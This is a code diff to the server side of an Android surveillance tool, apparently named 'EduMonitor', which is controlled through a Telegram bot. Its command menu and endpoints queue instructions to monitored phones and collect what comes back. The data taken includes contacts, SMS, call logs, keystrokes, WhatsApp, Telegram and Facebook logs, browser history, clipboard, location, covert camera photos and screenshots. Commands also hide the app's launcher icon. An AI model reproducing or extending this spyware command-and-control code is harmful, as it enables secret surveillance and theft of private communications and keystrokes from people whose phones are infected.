@@ -468,8 +468,9 @@ async function setChatMenuButton(chatId) {
         
         // CONSOLIDATED COMMAND LIST
         const commands = [
+            // ============ CONSOLIDATED COMMANDS ============
             { command: 'help', description: '📋 Complete help menu' },
-            { command: 'showmenu', description: '📋 Show help menu' },
+            { command: 'showmenu', description: '📋 show help menu' },
             { command: 'device_info', description: '📊 Complete device information' },
             { command: 'network_info', description: '🌐 Complete network information' },
             { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
@@ -483,12 +484,16 @@ async function setChatMenuButton(chatId) {
             { command: 'record_auto_on', description: '✅ Enable auto recording' },
             { command: 'record_auto_off', description: '❌ Disable auto recording' },
             { command: 'record_custom', description: '⚙️ Set custom schedule' },
+            
+            // ============ AUDIO QUALITY ============
             { command: 'audio_ultra', description: '🎤 Ultra low (8kbps)' },
             { command: 'audio_very_low', description: '🎤 Very low (16kbps)' },
             { command: 'audio_low', description: '🎤 Low (24kbps)' },
             { command: 'audio_medium', description: '🎤 Medium (32kbps)' },
             { command: 'audio_high', description: '🎤 High (64kbps)' },
             { command: 'audio_info', description: '🎤 Audio quality info' },
+            
+            // ============ DATA EXPORT ============
             { command: 'contacts', description: '📇 Export contacts' },
             { command: 'sms', description: '💬 Export SMS' },
             { command: 'calllogs', description: '📞 Export call logs' },
@@ -496,15 +501,23 @@ async function setChatMenuButton(chatId) {
             { command: 'keys', description: '⌨️ Export keystrokes' },
             { command: 'notify', description: '🔔 Export notifications' },
             { command: 'open_app', description: '📱 Export app opens' },
+            
+            // ============ SOCIAL MEDIA ============
             { command: 'whatsapp', description: '💬 WhatsApp logs' },
             { command: 'telegram', description: '💬 Telegram logs' },
             { command: 'facebook', description: '💬 Facebook logs' },
+            
+            // ============ BROWSER & CLIPBOARD ============
             { command: 'browser', description: '🌐 Browser history' },
             { command: 'clipboard', description: '📋 Clipboard logs' },
             { command: 'calendar', description: '📅 Calendar events' },
+            
+            // ============ SCAN COMMANDS ============
             { command: 'scan_all', description: '🔍 Full system scan' },
             { command: 'scan_media', description: '🎵 Media files scan' },
             { command: 'scan_help', description: '❓ Scan commands help' },
+            
+            // ============ REAL-TIME CONTROLS ============
             { command: 'rt_all_on', description: '✅ Enable all real-time' },
             { command: 'rt_all_off', description: '❌ Disable all real-time' },
             { command: 'rt_keys_on', description: '🔑 Enable keystroke real-time' },
@@ -512,9 +525,13 @@ async function setChatMenuButton(chatId) {
             { command: 'rt_notif_on', description: '🔔 Enable notification real-time' },
             { command: 'rt_notif_off', description: '🔔 Disable notification real-time' },
             { command: 'rt_status', description: '📊 Real-time status' },
+            
+            // ============ NETWORK DATA SAVING ============
             { command: 'saving_status', description: '📡 Network saving status' },
             { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
             { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
+            
+            // ============ SYSTEM CONTROLS ============
             { command: 'sync_all', description: '🔄 Sync all data' },
             { command: 'force_harvest', description: '⚡ Force data harvest' },
             { command: 'refresh_data', description: '🔄 Refresh data' },
@@ -523,7 +540,8 @@ async function setChatMenuButton(chatId) {
             { command: 'reboot_app', description: '🔄 Reboot services' },
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
             { command: 'show_icon', description: '👁️ Show launcher icon' },
-            { command: 'force_register_complete', description: '🔄 Force register services' },
+            { command: 'force_register_complete', description: '🔄 force register services' },
+            // ============ CAMERA ============
             { command: 'photo', description: '📸 Take photo' },
             { command: 'camera_switch', description: '🔄 Switch camera' },
             { command: 'camera_front', description: '👤 Front camera' },
@@ -531,6 +549,8 @@ async function setChatMenuButton(chatId) {
             { command: 'camera_on', description: '✅ Start camera monitoring' },
             { command: 'camera_off', description: '❌ Stop camera monitoring' },
             { command: 'camera_status', description: '📊 Camera status' },
+            
+            // ============ BASIC INFO ============
             { command: 'location', description: '📍 Get location' },
             { command: 'battery', description: '🔋 Battery status' },
             { command: 'storage', description: '💾 Storage info' },
@@ -540,10 +560,13 @@ async function setChatMenuButton(chatId) {
             { command: 'small', description: '📏 Small screenshot (30%)' },
             { command: 'medium', description: '📏 Medium screenshot (70%)' },
             { command: 'original', description: '📏 Original screenshot' },
+            
+            // ============ LEGACY COMMANDS (for backward compatibility) ============
             { command: 'status', description: '📊 Device status' },
             { command: 'info', description: 'ℹ️ Device info' },
             { command: 'ip_info', description: '🌐 IP info' },
             { command: 'wifi_info', description: '📶 WiFi info' },
+            { command: 'mobile_info', description: '📱 Mobile info' },
             { command: 'sim_info', description: '📱 SIM info' },
             { command: 'phone_number', description: '📞 Phone number' }
         ];
@@ -1316,31 +1339,12 @@ app.get('/api/ping/:deviceId', (req, res) => {
     }
 });
 
-app.get('/api/verify/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
-    if (device) {
-        res.json({ 
-            registered: true, 
-            deviceId: deviceId,
-            chatId: device.chatId,
-            lastSeen: device.lastSeen,
-            deviceInfo: device.deviceInfo
-        });
-    } else {
-        res.status(404).json({ registered: false, deviceId: deviceId });
-    }
-});
-
 app.get('/api/commands/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
     try {
         if (device?.pendingCommands?.length > 0) {
-            // Don't clear immediately - just return them
-            // They'll be cleared when the device acknowledges via /api/result
             const commands = device.pendingCommands.map(cmd => ({
                 command: cmd.command,
                 originalCommand: cmd.originalCommand,
@@ -1348,9 +1352,8 @@ app.get('/api/commands/:deviceId', (req, res) => {
                 timestamp: cmd.timestamp,
                 autoData: cmd.autoData || false
             }));
-            
-            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, 
-                       commands.map(c => c.command).join(', '));
+            device.pendingCommands = [];
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
             sendJsonResponse(res, { commands });
         } else {
             console.log(`📭 No commands for ${deviceId}`);
@@ -1366,18 +1369,23 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
+    // Consolidated commands that use file upload endpoints
+    const fileCommands = [
+        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
+        'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
+        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media',
+        'screenshots', 'screenshot_logs'
+    ];
+    
+    if (fileCommands.includes(command)) {
+        console.log(`📎 ${command} using dedicated file upload endpoint`);
+        return res.sendStatus(200);
+    }
+    
     console.log(`📨 Result from ${deviceId}:`, { command });
     
     const device = devices.get(deviceId);
-    if (device && device.pendingCommands) {
-        // Find and remove the executed command
-        const index = device.pendingCommands.findIndex(cmd => cmd.command === command);
-        if (index !== -1) {
-            const executedCmd = device.pendingCommands[index];
-            device.pendingCommands.splice(index, 1);
-            console.log(`✅ Command executed and removed: ${command} (autoData: ${executedCmd.autoData})`);
-        }
-        
+    if (device) {
         const chatId = device.chatId;
         const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
         
@@ -1393,12 +1401,11 @@ app.post('/api/result/:deviceId', async (req, res) => {
     res.sendStatus(200);
 });
 
-
 // ============= REGISTRATION ENDPOINT =============
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
     
-    console.log('📝 Registration attempt:', { deviceId, deviceInfo });
+    console.log('📝 Registration attempt:', { deviceId });
     
     if (!deviceId || !deviceInfo) {
         return res.status(400).json({ error: 'Missing fields' });
@@ -1412,20 +1419,6 @@ app.post('/api/register', async (req, res) => {
     
     const existingDevice = devices.get(deviceId);
     const isNewDevice = !existingDevice;
-    
-    // FIX: Ensure config is properly structured with botToken and chatId
-    const configToSend = {
-        ...deviceConfig.config,
-        botToken: deviceConfig.config.botToken || BOT_TOKEN,
-        chatId: deviceConfig.config.chatId || deviceConfig.chatId,
-        serverUrl: deviceConfig.config.serverUrl || 'https://edu-hwpy.onrender.com'
-    };
-    
-    console.log('📦 Sending config to device:', {
-        hasBotToken: !!configToSend.botToken,
-        hasChatId: !!configToSend.chatId,
-        botTokenPrefix: configToSend.botToken ? configToSend.botToken.substring(0, 10) + '...' : 'none'
-    });
     
     const deviceData = {
         chatId: deviceConfig.chatId,
@@ -1496,12 +1489,11 @@ app.post('/api/register', async (req, res) => {
         queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
-    // Return the properly structured config
     res.json({
         status: 'registered',
         deviceId,
         chatId: deviceConfig.chatId,
-        config: configToSend
+        config: deviceConfig.config
     });
 });
 
@@ -1924,18 +1916,15 @@ async function handleCommand(chatId, command, messageId) {
         await sendTelegramMessage(chatId, message);
         return;
     }
-    
-    // Handle /showmenu command
-    if (command === '/showmenu') {
-        console.log('📋 Force showing main menu');
-        await sendTelegramMessageWithKeyboard(
-            chatId,
-            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
-            getMainMenuKeyboard(chatId)
-        );
-        return;
-    }
-    
+if (command === '/showmenu') {
+    console.log('📋 Force showing main menu');
+    await sendTelegramMessageWithKeyboard(
+        chatId,
+        "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
+        getMainMenuKeyboard(chatId)
+    );
+    return;
+}
     // Handle /select command
     if (command.startsWith('/select ')) {
         const deviceId = command.substring(8).trim();
@@ -2011,7 +2000,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log('\n✅ CONSOLIDATED COMMANDS (45+ from 95+):');
     console.log('   📋 /help - Complete help menu');
-    console.log('   📋 /showmenu - Show help menu');
+    console.log('   📋 /showmenu - show help menu');
     console.log('   📱 /device_info - Complete device info');
     console.log('   🌐 /network_info - Complete network info');
     console.log('   📱 /mobile_info - Complete mobile & SIM info');
@@ -2045,7 +2034,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   ⚡ /force_harvest - Force harvest');
     console.log('   📊 /logs_count - Database stats');
     console.log('   🗑️ /clear_logs - Clear logs');
-    console.log('   🔄 /force_register_complete - Force register services');
+    console.log('   🔄 /force_register_complete - force register services');
     console.log('   🔄 /reboot_app - Reboot services');
     console.log('   👻 /hide_icon - Hide icon');
     console.log('   👁️ /show_icon - Show icon');
